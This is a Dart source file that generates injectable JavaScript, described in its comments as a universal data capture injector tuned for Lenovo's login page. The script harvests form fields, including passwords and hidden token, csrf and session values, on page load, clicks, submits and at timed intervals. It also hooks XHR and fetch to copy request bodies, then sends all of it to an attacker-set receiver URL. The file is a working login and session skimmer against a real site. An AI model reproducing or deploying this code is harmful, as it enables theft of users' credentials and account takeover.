/// 通用数据捕获注入器
/// 专门针对复杂网站（如联想登录页面）进行优化
class UniversalCaptureInjector {
  /// 生成通用捕获脚本
  static String generateCaptureScript(String receiverUrl, {
    bool enableRealTimeInput = true,
    bool enableClickCapture = true,
    bool enableFormSubmit = true,
    bool enableNetworkCapture = true,
  }) {
    return '''
(function() {
    'use strict';
    
    const RECEIVER_URL = '$receiverUrl';
    let captureQueue = [];
    let isProcessing = false;
    
    // 安全的数据发送函数
    function sendCapturedData(data) {
        captureQueue.push(data);
        if (!isProcessing) {
            processQueue();
        }
    }
    
    async function processQueue() {
        if (captureQueue.length === 0) return;
        isProcessing = true;
        
        while (captureQueue.length > 0) {
            const data = captureQueue.shift();
            try {
                // 尝试多种发送方式确保数据不丢失
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(RECEIVER_URL, JSON.stringify(data));
                } else {
                    fetch(RECEIVER_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data),
                        keepalive: true
                    }).catch(() => {
                        // 如果fetch失败，尝试XHR
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', RECEIVER_URL, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(JSON.stringify(data));
                    });
                }
                await new Promise(resolve => setTimeout(resolve, 50)); // 避免请求过于频繁
            } catch (error) {
                console.debug('数据发送失败:', error);
            }
        }
        isProcessing = false;
    }
    
    // 智能表单数据提取 - 过滤无用数据，只捕获有价值的用户输入
    function captureAllFormData(type, additionalData = {}) {
        const allData = {
            timestamp: Date.now(),
            url: window.location.href,
            type: type,
            ...additionalData
        };
        
        // 过滤函数：判断字段是否有价值
        function isValueableField(name, value, input) {
            // 过滤空值
            if (!value || value.trim() === '') return false;
            
            // 过滤系统字段和隐藏字段（除非是重要的用户数据）
            const systemFields = [
                'lenovoid.', 'crossRealmDomains', 'path', 'sUrlRegister', 
                'isNeedPic', 'unnamed_', 'jsInputError', 'jsError403',
                'jsCodebutton2', 'jsURightTxt', 'jsPrivacyTxt'
            ];
            
            if (systemFields.some(field => name.includes(field))) {
                return false;
            }
            
            // 过滤隐藏字段（除非包含重要信息）
            if (input && input.type === 'hidden') {
                const importantHiddenFields = ['token', 'csrf', 'session', 'key'];
                return importantHiddenFields.some(field => name.toLowerCase().includes(field));
            }
            
            // 过滤固定值和默认值
            const ignoredValues = ['null', 'undefined', '0', '1', 'true', 'false'];
            if (ignoredValues.includes(value.toLowerCase())) return false;
            
            return true;
        }
        
        // 方法1: 获取表单中的有价值数据
        const forms = {};
        document.querySelectorAll('form').forEach((form, index) => {
            const formData = new FormData(form);
            const formObj = {};
            
            // 提取FormData并过滤
            for (let [key, value] of formData.entries()) {
                const input = form.querySelector(`[name="\${key}"]`);
                if (isValueableField(key, value, input)) {
                    formObj[key] = value;
                }
            }
            
            // 额外提取可能被遗漏的有价值字段
            form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], textarea, select').forEach(input => {
                const name = input.name || input.id;
                const value = input.value;
                
                if (name && value && isValueableField(name, value, input) && !formObj.hasOwnProperty(name)) {
                    formObj[name] = value;
                }
            });
            
            // 只保存有有价值数据的表单
            if (Object.keys(formObj).length > 0) {
                const formName = form.id || form.className.split(' ')[0] || 'form_' + index;
                forms[formName] = {
                    action: form.action || '',
                    method: form.method || 'GET',
                    data: formObj
                };
            }
        });
        
        // 方法2: 获取独立输入框中的有价值数据
        const independentInputs = {};
        document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], textarea, select').forEach(input => {
            if (!input.closest('form') && input.value) {
                const name = input.name || input.id || input.placeholder;
                const value = input.value;
                
                if (name && isValueableField(name, value, input)) {
                    independentInputs[name] = {
                        value: value,
                        type: input.type,
                        placeholder: input.placeholder || ''
                    };
                }
            }
        });
        
        // 方法3: 从JavaScript变量中提取数据（保持不变）
        const jsData = {};
        try {
            const commonVars = ['formData', 'loginData', 'userData', 'submitData', 'postData'];
            commonVars.forEach(varName => {
                if (window[varName] && typeof window[varName] === 'object') {
                    jsData[varName] = window[varName];
                }
            });
        } catch (e) {}
        
        // 组合所有数据
        const payload = {
            forms: forms,
            independentInputs: independentInputs,
            jsData: jsData,
            trigger: additionalData
        };
        
        // 只有当有实际有价值的数据时才发送
        if (Object.keys(forms).length > 0 || Object.keys(independentInputs).length > 0 || Object.keys(jsData).length > 0) {
            sendCapturedData({
                ...allData,
                payload: payload
            });
        }
    }
    
    ${enableClickCapture ? _generateAdvancedClickCapture() : ''}
    ${enableFormSubmit ? _generateFormSubmitCapture() : ''}
    ${enableNetworkCapture ? _generateNetworkCapture() : ''}
    ${enableRealTimeInput ? _generateRealTimeInputCapture() : ''}
    
    // 页面加载完成后立即捕获一次初始状态
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => captureAllFormData('PAGE_READY'), 1000);
        });
    } else {
        setTimeout(() => captureAllFormData('PAGE_READY'), 1000);
    }
    
    // 减少定期捕获频率，避免产生太多杂项数据
    // 只在用户有活动时才进行定期捕获
    let lastActivity = Date.now();
    let periodicTimer = null;
    
    function resetPeriodicCapture() {
        lastActivity = Date.now();
        if (periodicTimer) clearInterval(periodicTimer);
        
        // 用户活动后60秒开始定期捕获，每2分钟一次
        periodicTimer = setTimeout(() => {
            const interval = setInterval(() => {
                if (Date.now() - lastActivity > 300000) { // 5分钟无活动则停止
                    clearInterval(interval);
                    return;
                }
                captureAllFormData('PERIODIC_SNAPSHOT');
            }, 120000); // 每2分钟捕获一次
        }, 60000);
    }
    
    // 监听用户活动
    ['click', 'input', 'keydown'].forEach(event => {
        document.addEventListener(event, resetPeriodicCapture, { passive: true });
    });
    
    console.debug('通用数据捕获器已激活');
})();
''';
  }
  
  /// 生成高级点击捕获代码
  static String _generateAdvancedClickCapture() {
    return '''
    // 高级点击事件监听 - 覆盖更多元素类型
    document.addEventListener('click', function(event) {
        const target = event.target;
        
        // 扩展的可点击元素选择器
        const clickableSelectors = [
            'button',
            'input[type="submit"]',
            'input[type="button"]',
            '[role="button"]',
            'a[href*="javascript"]',
            '.btn', '.button', '.submit',
            '[onclick]',
            '.jsSubBtn', '.jsLogin', '.jsRegister', // 针对联想页面的特定类名
            '.jsCodebutton', '.jsCReset'
        ];
        
        const isClickableElement = clickableSelectors.some(selector => {
            try {
                return target.matches(selector) || target.closest(selector);
            } catch (e) {
                return false;
            }
        });
        
        if (isClickableElement) {
            // 延迟执行以确保DOM更新完成
            setTimeout(() => {
                captureAllFormData('FORM_SNAPSHOT', {
                    trigger: {
                        tagName: target.tagName,
                        id: target.id || '',
                        className: target.className || '',
                        text: target.textContent || target.value || target.innerText || '',
                        type: target.type || '',
                        name: target.name || ''
                    }
                });
            }, 200); // 增加延迟时间以确保动态内容加载完成
        }
    }, true);
    ''';
  }
  
  /// 生成表单提交捕获代码
  static String _generateFormSubmitCapture() {
    return '''
    // 表单提交事件监听
    document.addEventListener('submit', function(event) {
        const form = event.target;
        captureAllFormData('FORM_SUBMIT', {
            formAction: form.action || '',
            formMethod: form.method || 'GET',
            formId: form.id || '',
            formClassName: form.className || ''
        });
    }, true);
    ''';
  }
  
  /// 生成网络请求捕获代码
  static String _generateNetworkCapture() {
    return '''
    // XHR拦截
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url, ...args) {
        this._captureMethod = method;
        this._captureUrl = url;
        return originalXHROpen.apply(this, [method, url, ...args]);
    };
    
    XMLHttpRequest.prototype.send = function(data) {
        if (data && this._captureUrl && !this._captureUrl.includes(RECEIVER_URL)) {
            try {
                sendCapturedData({
                    type: 'XHR',
                    timestamp: Date.now(),
                    url: window.location.href,
                    payload: {
                        method: this._captureMethod,
                        url: this._captureUrl,
                        data: data
                    }
                });
            } catch (e) {}
        }
        return originalXHRSend.apply(this, arguments);
    };
    
    // Fetch拦截
    const originalFetch = window.fetch;
    window.fetch = function(input, init) {
        const url = typeof input === 'string' ? input : input.url;
        if (init && init.body && !url.includes(RECEIVER_URL)) {
            try {
                sendCapturedData({
                    type: 'FETCH',
                    timestamp: Date.now(),
                    url: window.location.href,
                    payload: {
                        method: init.method || 'GET',
                        url: url,
                        data: init.body
                    }
                });
            } catch (e) {}
        }
        return originalFetch.apply(this, arguments);
    };
    ''';
  }
  
  /// 生成实时输入捕获代码
  static String _generateRealTimeInputCapture() {
    return '''
    // 实时输入监听（防抖处理，只捕获有价值的输入）
    let inputTimers = new Map();
    
    document.addEventListener('input', function(event) {
        const target = event.target;
        
        // 只监听用户可见的重要输入框
        if (target.matches('input[type="text"], input[type="email"], input[type="password"], textarea, select')) {
            const key = target.name || target.id || 'unnamed';
            const value = target.value;
            
            // 过滤无价值的输入
            if (!value || value.length < 2) return; // 至少2个字符
            
            // 过滤系统字段
            const systemFields = ['lenovoid.', 'crossRealmDomains', 'path', 'unnamed_'];
            if (systemFields.some(field => key.includes(field))) return;
            
            // 清除之前的定时器
            if (inputTimers.has(key)) {
                clearTimeout(inputTimers.get(key));
            }
            
            // 设置新的定时器（防抖）
            inputTimers.set(key, setTimeout(() => {
                if (target.value && target.value.length >= 2) {
                    sendCapturedData({
                        type: 'INPUT',
                        timestamp: Date.now(),
                        url: window.location.href,
                        payload: {
                            name: target.name || target.id || '',
                            type: target.type || '',
                            value: target.type === 'password' ? '[PASSWORD]' : target.value,
                            placeholder: target.placeholder || ''
                        }
                    });
                }
                inputTimers.delete(key);
            }, 2000)); // 2秒防抖，减少频繁捕获
        }
    }, true);
    ''';
  }
}